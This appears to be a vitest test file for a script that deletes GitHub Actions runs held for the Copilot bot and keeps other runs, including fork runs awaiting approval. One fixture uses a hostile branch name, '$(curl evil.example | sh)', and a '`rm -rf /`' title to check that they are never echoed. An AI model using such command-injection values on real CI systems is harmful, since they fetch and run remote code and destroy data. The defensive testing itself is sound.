import { describe, expect, it } from 'vitest';
import { COPILOT, type GitHub, heldForCopilot, PAGES, type Run, sweep, toDelete } from './copilot-held-runs.ts';

/**
 * Runs as GitHub listed them in this repository, with what the choice reads, and the branch and title it must not:
 * kept here to show that nothing turns on them.
 */
const copilot = { id: 175_728_472, login: 'Copilot', type: 'Bot' };
const martin = { id: 6_206_459, login: 'mrogan', type: 'User' };

/** review.yml, started by Copilot's held run of pull-request.yml when its pull request closed: held on main. */
const HELD_GATE = {
  id: 41_116_905_548,
  name: 'review',
  path: '.github/workflows/review.yml',
  event: 'workflow_run',
  status: 'completed',
  conclusion: 'action_required',
  run_attempt: 1,
  head_branch: 'main',
  display_title: 'review',
  actor: copilot,
  triggering_actor: copilot,
};

/** pull-request.yml, held for Copilot's commented review, failed once its pull request closed: no job. */
const HELD_REQUEST = {
  id: 41_149_250_778,
  name: 'pull request',
  path: '.github/workflows/pull-request.yml',
  event: 'pull_request_review',
  status: 'completed',
  conclusion: 'failure',
  run_attempt: 1,
  head_branch: 'docs/designs-c-guardrails',
  display_title: "docs(design): draw Part C's guardrails, red-team menu, auto-rollback and approval routing",
  actor: copilot,
  triggering_actor: copilot,
};

/** Copilot's held run of pull-request.yml, re-run by Martin: it passed, with his name on the attempt. */
const RERUN = {
  id: 41_185_642_899,
  name: 'pull request',
  path: '.github/workflows/pull-request.yml',
  event: 'pull_request_review',
  status: 'completed',
  conclusion: 'success',
  run_attempt: 2,
  head_branch: 'feat/auto-rollback-escalate',
  display_title: 'feat(release): hold a canary judged bad for Martin, and take his abort of it for a rollback',
  actor: copilot,
  triggering_actor: martin,
};

/** Copilot's own review, a dynamic workflow of GitHub's, which failed after its job ran. */
const COPILOT_REVIEWING = {
  id: 40_709_312_383,
  name: 'Running Copilot Code Review',
  path: 'dynamic/agents/copilot-pull-request-reviewer',
  event: 'dynamic',
  status: 'completed',
  conclusion: 'failure',
  run_attempt: 1,
  head_branch: 'fix/review-accepted-resolves-threads',
  display_title: 'Running Copilot Code Review',
  actor: copilot,
  triggering_actor: copilot,
};

/**
 * A first-time contributor's pull request from a fork, held for Martin's approval. None has come here yet, so this is
 * Copilot's held run with a contributor's account in its place, and a branch and title that would be trouble in a shell.
 */
const stranger = { id: 99_999_999, login: 'someone', type: 'User' };
const FORK = {
  ...HELD_REQUEST,
  id: 41_200_000_001,
  conclusion: 'action_required',
  head_branch: '$(curl evil.example | sh)',
  display_title: '`rm -rf /`',
  actor: stranger,
  triggering_actor: stranger,
};

describe('which runs are deleted', () => {
  it('deletes Copilot’s held run of each of the gate’s workflows, which never ran a job', () => {
    expect(COPILOT).toEqual(copilot);
    expect(toDelete(HELD_GATE, 0)).toBe(true);
    expect(toDelete(HELD_REQUEST, 0)).toBe(true);
    // Still waiting for approval, before its pull request closes.
    expect(toDelete({ ...HELD_REQUEST, conclusion: 'action_required' }, 0)).toBe(true);
  });

  it('keeps a fork’s held run, for Martin’s approval, whatever its branch and title say', () => {
    expect(heldForCopilot(FORK)).toBe(false);
    // An account that only calls itself Copilot is not it.
    expect(heldForCopilot({ ...HELD_GATE, actor: { ...stranger, login: 'Copilot' } })).toBe(false);
    expect(heldForCopilot({ ...HELD_GATE, actor: { ...copilot, type: 'User' } })).toBe(false);
    expect(heldForCopilot({ ...HELD_GATE, actor: null, triggering_actor: null })).toBe(false);
  });

  it('keeps a run of Copilot’s that ran: one Martin re-ran, and one that failed with jobs', () => {
    expect(toDelete(RERUN, 1)).toBe(false);
    // Re-run and failed, it is still his attempt.
    expect(heldForCopilot({ ...RERUN, conclusion: 'failure' })).toBe(false);
    expect(toDelete(HELD_REQUEST, 1)).toBe(false);
    expect(toDelete(COPILOT_REVIEWING, 0)).toBe(false);
  });

  it('keeps any other conclusion, a run still going, and any other workflow', () => {
    for (const conclusion of ['success', 'cancelled', 'skipped', 'timed_out', 'neutral', null]) {
      expect(heldForCopilot({ ...HELD_GATE, conclusion }), String(conclusion)).toBe(false);
    }
    expect(heldForCopilot({ ...HELD_GATE, status: 'waiting', conclusion: null })).toBe(false);
    expect(heldForCopilot({ ...HELD_GATE, path: '.github/workflows/check.yml' })).toBe(false);
    // A workflow named like the gate's, in another file.
    expect(heldForCopilot({ ...HELD_GATE, path: '.github/workflows/review.yml.bak' })).toBe(false);
    expect(heldForCopilot({ ...HELD_GATE, path: 'other/.github/workflows/review.yml' })).toBe(false);
  });
});

/** GitHub, answering from a list of runs with their jobs, and remembering what it was asked. */
function github(runs: (Run & { jobs: number })[], gone: number[] = []) {
  const asked: string[] = [];
  const removed: number[] = [];
  const fake: GitHub = {
    runs: async (file, conclusion, page) => {
      asked.push(`${file} ${conclusion} ${page}`);
      const matching = runs.filter(
        (run) => run.path.endsWith(`/${file}`) && run.conclusion === conclusion && run.actor?.login === 'Copilot',
      );
      return matching.slice((page - 1) * 100, page * 100);
    },
    jobs: async (id) => runs.find((run) => run.id === id)?.jobs ?? 0,
    remove: async (id) => {
      if (id === 13) throw new Error('DELETE run: 403 Resource not accessible by integration');
      if (gone.includes(id)) return false;
      removed.push(id);
      return true;
    },
  };
  return { fake, asked, removed };
}

describe('a pass', () => {
  const runs = [
    { ...HELD_GATE, jobs: 0 },
    { ...HELD_REQUEST, jobs: 0 },
    { ...HELD_REQUEST, id: 2, jobs: 1 },
    { ...RERUN, jobs: 1 },
    { ...COPILOT_REVIEWING, jobs: 1 },
    { ...FORK, jobs: 0 },
  ];

  it('deletes Copilot’s held runs and nothing else, and says so', async () => {
    const { fake, removed } = github(runs);
    const lines: string[] = [];
    const outcome = await sweep(fake, false, (line) => lines.push(line));
    expect(removed).toEqual([HELD_REQUEST.id, HELD_GATE.id]);
    expect(outcome).toEqual({ deleted: removed, gone: [], kept: [2], failed: [] });
    expect(lines).toContain(`Deleted ${HELD_GATE.id} (review.yml, action_required).`);
    expect(lines).toContain('Kept 2 (pull-request.yml, failure): it has 1 job.');
    // The run's branch and title are never written out.
    expect(lines.join('\n')).not.toMatch(/designs-c-guardrails|curl|rm -rf/);
  });

  it('deletes nothing in a dry run, and says what it would', async () => {
    const { fake, removed } = github(runs);
    const lines: string[] = [];
    const outcome = await sweep(fake, true, (line) => lines.push(line));
    expect(removed).toEqual([]);
    expect(outcome.deleted.sort()).toEqual([HELD_GATE.id, HELD_REQUEST.id].sort());
    expect(lines).toContain(`Would delete ${HELD_REQUEST.id} (pull-request.yml, failure).`);
  });

  it('pages through every run, the oldest held runs too, before deleting any', async () => {
    const many = Array.from({ length: 250 }, (_, i) => ({ ...HELD_GATE, id: 1000 + i, jobs: 0 }));
    const { fake, asked, removed } = github(many);
    await sweep(fake, false, () => {});
    expect(removed).toHaveLength(250);
    expect(asked.filter((a) => a.startsWith('review.yml action_required'))).toEqual([
      'review.yml action_required 1',
      'review.yml action_required 2',
      'review.yml action_required 3',
    ]);
    expect(asked).toContain('pull-request.yml failure 1');
  });

  it('stops after its last page, and warns that the rest wait', async () => {
    const many = Array.from({ length: PAGES * 100 + 1 }, (_, i) => ({ ...HELD_GATE, id: 1000 + i, jobs: 0 }));
    const { fake, removed } = github(many);
    const lines: string[] = [];
    await sweep(fake, true, (line) => lines.push(line));
    expect(removed).toEqual([]);
    expect(lines).toContain(`::warning::review.yml has ${PAGES * 100} runs action_required or more: any more wait.`);
  });

  it('deletes what it found when a listing fails, and reports the listing', async () => {
    const { fake, removed } = github([{ ...HELD_GATE, jobs: 0 }]);
    const failing: GitHub = {
      ...fake,
      runs: async (file, conclusion, page) => {
        if (file === 'pull-request.yml') throw new Error('GET runs: 502 Bad Gateway');
        return fake.runs(file, conclusion, page);
      },
    };
    const outcome = await sweep(failing, false, () => {});
    expect(removed).toEqual([HELD_GATE.id]);
    expect(outcome.failed).toEqual([
      { list: 'pull-request.yml action_required', error: 'GET runs: 502 Bad Gateway' },
      { list: 'pull-request.yml failure', error: 'GET runs: 502 Bad Gateway' },
    ]);
  });

  it('goes on past a run it could not delete, and one gone already, and reports both', async () => {
    const { fake, removed } = github(
      [
        { ...HELD_GATE, id: 13, jobs: 0 },
        { ...HELD_GATE, id: 14, jobs: 0 },
        { ...HELD_REQUEST, jobs: 0 },
      ],
      [14],
    );
    const outcome = await sweep(fake, false, () => {});
    expect(removed).toEqual([HELD_REQUEST.id]);
    expect(outcome.gone).toEqual([14]);
    expect(outcome.failed).toEqual([{ id: 13, error: 'DELETE run: 403 Resource not accessible by integration' }]);
  });
});
